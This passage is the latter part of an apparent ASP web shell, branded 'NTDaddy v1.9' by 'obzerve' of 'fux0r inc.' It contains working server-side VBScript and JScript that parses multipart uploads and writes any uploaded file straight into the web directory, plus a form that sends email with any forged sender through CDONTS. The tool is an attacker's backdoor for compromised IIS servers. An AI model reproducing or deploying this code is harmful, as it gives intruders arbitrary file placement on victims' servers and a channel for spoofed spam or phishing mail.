<td><input name=From size=30 style="HEIGHT: 22px; WIDTH: 321px"></td></tr>
<tr>
<td bgcolor="#F8F8FF"><font color="#000000"><b>To:</b></font> </td>
<td><input name=To size=30 style="HEIGHT: 22px; WIDTH: 321px"></td></tr>
<tr>
<td bgcolor="#F8F8FF"><font color="#000000"><b>Subject:</b></font> </td>
<td><input name=Subject size=30 style="HEIGHT: 22px; WIDTH: 321px"></td></tr>
<tr>
<td valign="top" bgcolor="#F8F8FF"><font color="#000000"><b>Body:</b></font> </td>
<td><textarea cols=30 name=Body rows=5 style="HEIGHT: 86px; WIDTH: 322px" wrap=virtual></textarea></td>
</tr>
<tr>
<td align="right" bgcolor="#F8F8FF" colspan="2">
<input type="submit" value="Send Mail">
<input type="hidden" name="flag" value="1"></td>
</tr>
</table>
<br>
<hr color="#ffffff">
<font size="#ffffff"><center>•[ <b>NTDaddy v1.9</b> ][ by obzerve ][ for the brothers of <b>fux0r inc.</b> 2k+1 ]•</b></center></font>
</body>
</html>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
Const IncludeType = 2 
Dim UploadSizeLimit
Function GetUpload()
Dim Result
Set Result = Nothing
If Request.ServerVariables("REQUEST_METHOD") = "POST" Then 
Dim CT, PosB, Boundary, Length, PosE
CT = Request.ServerVariables("HTTP_Content_Type") 
If LCase(Left(CT, 19)) = "multipart/form-data" Then 
PosB = InStr(LCase(CT), "boundary=") 
If PosB > 0 Then Boundary = Mid(CT, PosB + 9) 
PosB = InStr(LCase(CT), "boundary=") 
If PosB > 0 then 
PosB = InStr(Boundary, ",")
If PosB > 0 Then Boundary = Left(Boundary, PosB - 1)
end if
Length = CLng(Request.ServerVariables("HTTP_Content_Length")) 
If "" & UploadSizeLimit <> "" Then
UploadSizeLimit = CLng(UploadSizeLimit)
If Length > UploadSizeLimit Then
Request.BinaryRead (Length)
Err.Raise 2, "GetUpload", "Upload size " & FormatNumber(Length, 0) & "B exceeds limit of " & FormatNumber(UploadSizeLimit, 0) & "B"
Exit Function
End If
End If
If Length > 0 And Boundary <> "" Then 
Boundary = "--" & Boundary
Dim Head, Binary
Binary = Request.BinaryRead(Length) 
Set Result = SeparateFields(Binary, Boundary)
Binary = Empty 
Else
Err.Raise 10, "GetUpload", "Zero length request ."
End If
Else
Err.Raise 11, "GetUpload", "No file sent."
End If
Else
Err.Raise 1, "GetUpload", "Bad request method."
End If
Set GetUpload = Result
End Function
Function SeparateFields(Binary, Boundary)
Dim PosOpenBoundary, PosCloseBoundary, PosEndOfHeader, isLastBoundary
Dim Fields
Boundary = StringToBinary(Boundary)
PosOpenBoundary = InStrB(Binary, Boundary)
PosCloseBoundary = InStrB(PosOpenBoundary + LenB(Boundary), Binary, Boundary, 0)
Set Fields = CreateObject("Scripting.Dictionary")
Do While (PosOpenBoundary > 0 And PosCloseBoundary > 0 And Not isLastBoundary)
Dim HeaderContent, FieldContent, bFieldContent
Dim Content_Disposition, FormFieldName, SourceFileName, Content_Type
Dim Field, TwoCharsAfterEndBoundary
PosEndOfHeader = InStrB(PosOpenBoundary + Len(Boundary), Binary, StringToBinary(vbCrLf + vbCrLf))
HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2)
bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2)
GetHeadFields BinaryToString(HeaderContent), Content_Disposition, FormFieldName, SourceFileName, Content_Type
Set Field = CreateUploadField() 
Set FieldContent = CreateBinaryData()
FieldContent.ByteArray = bFieldContent
FieldContent.Length = LenB(bFieldContent)
Field.Name = FormFieldName
Field.ContentDisposition = Content_Disposition
Field.FilePath = SourceFileName
Field.FileName = GetFileName(SourceFileName)
Field.ContentType = Content_Type
Field.Length = FieldContent.Length
Set Field.Value = FieldContent
Fields.Add FormFieldName, Field
TwoCharsAfterEndBoundary = BinaryToString(MidB(Binary, PosCloseBoundary + LenB(Boundary), 2))
isLastBoundary = TwoCharsAfterEndBoundary = "--"
If Not isLastBoundary Then 
PosOpenBoundary = PosCloseBoundary
PosCloseBoundary = InStrB(PosOpenBoundary + LenB(Boundary), Binary, Boundary)
End If
Loop
Set SeparateFields = Fields
End Function
Function GetHeadFields(ByVal Head, Content_Disposition, Name, FileName, Content_Type)
Content_Disposition = LTrim(SeparateField(Head, "content-disposition:", ";"))
Name = (SeparateField(Head, "name=", ";")) 
If Left(Name, 1) = """" Then Name = Mid(Name, 2, Len(Name) - 2)
FileName = (SeparateField(Head, "filename=", ";")) 
If Left(FileName, 1) = """" Then FileName = Mid(FileName, 2, Len(FileName) - 2)
Content_Type = LTrim(SeparateField(Head, "content-type:", ";"))
End Function
Function SeparateField(From, ByVal sStart, ByVal sEnd)
Dim PosB, PosE, sFrom
sFrom = LCase(From)
PosB = InStr(sFrom, sStart)
If PosB > 0 Then
PosB = PosB + Len(sStart)
PosE = InStr(PosB, sFrom, sEnd)
If PosE = 0 Then PosE = InStr(PosB, sFrom, vbCrLf)
If PosE = 0 Then PosE = Len(sFrom) + 1
SeparateField = Mid(From, PosB, PosE - PosB)
Else
SeparateField = Empty
End If
End Function
Function GetFileName(FullPath)
Dim Pos, PosF
PosF = 0
For Pos = Len(FullPath) To 1 Step -1
Select Case Mid(FullPath, Pos, 1)
Case "/", "\": PosF = Pos + 1: Pos = 0
End Select
Next
If PosF = 0 Then PosF = 1
GetFileName = Mid(FullPath, PosF)
End Function
Function BinaryToString(Binary)
dim cl1, cl2, cl3, pl1, pl2, pl3
Dim L
cl1 = 1
cl2 = 1
cl3 = 1
L = LenB(Binary)
Do While cl1<=L
pl3 = pl3 & Chr(AscB(MidB(Binary,cl1,1)))
cl1 = cl1 + 1
cl3 = cl3 + 1
if cl3>300 then
pl2 = pl2 & pl3
pl3 = ""
cl3 = 1
cl2 = cl2 + 1
if cl2>200 then
pl1 = pl1 & pl2
pl2 = ""
cl2 = 1
End If
End If
Loop
BinaryToString = pl1 & pl2 & pl3
End Function
Function BinaryToStringold(Binary)
Dim I, S
For I = 1 To LenB(Binary)
S = S & Chr(AscB(MidB(Binary, I, 1)))
Next
BinaryToString = S
End Function
Function StringToBinary(String)
Dim I, B
For I=1 to len(String)
B = B & ChrB(Asc(Mid(String,I,1)))
Next
StringToBinary = B
End Function
Function vbsSaveAs(FileName, ByteArray)
Dim FS, TextStream
Set FS = CreateObject("Scripting.FileSystemObject")
Set TextStream = FS.CreateTextFile(FileName)
TextStream.Write BinaryToString(ByteArray) 
TextStream.Close
End Function
</SCRIPT>
<SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
function CreateUploadField(){ return new uf_Init() }
function uf_Init(){
this.Name = null
this.ContentDisposition = null
this.FileName = null
this.FilePath = null
this.ContentType = null
this.Value = null
this.Length = null
}
function CreateBinaryData(){ return new bin_Init() }
function bin_Init(){
this.ByteArray = null
this.Length = null
this.String = jsBinaryToString
this.SaveAs = jsSaveAs
}
function jsBinaryToString(){
return BinaryToString(this.ByteArray)
}
function jsSaveAs(FileName){
return vbsSaveAs(FileName, this.ByteArray)
}
</SCRIPT>
<%
If Request.ServerVariables("REQUEST_METHOD") = "POST" Then 
Set Fields = GetUpload()
FilePath = Server.MapPath(".") & "\" & Fields("File1").FileName
Fields("File1").Value.SaveAs FilePath
End If
%>
<%
Else
Dim anonFrom,anonTo,anonSubj,anonBody
anonFrom = request.form("From")
anonTo = request.form("To")
anonSubj = request.form("Subject")
anonBody = request.form("Body")
Set objMail = CreateObject("CDONTS.NewMail")
objMail.From=anonFrom
objMail.To=anonTo
objMail.Subject=anonSubj
objMail.Body=anonBody
intReturn=objMail.Send()
%>
<html>
<head><title>|[NTDaddy v1.9 | anon email]</title></head>
<h1>Message sent successfully!</h1><br><br><br>
<table border=0 cellpadding="0" cellspacing="3">
<tr>
<td>
<input type='button' value='Back' onclick=history.back()> </td>
<td>
<h2>[NTDaddy v1.9 - obzerve | fux0r inc.]</h2> </td>
</tr>
</table>
</html>
<%
End if
%>



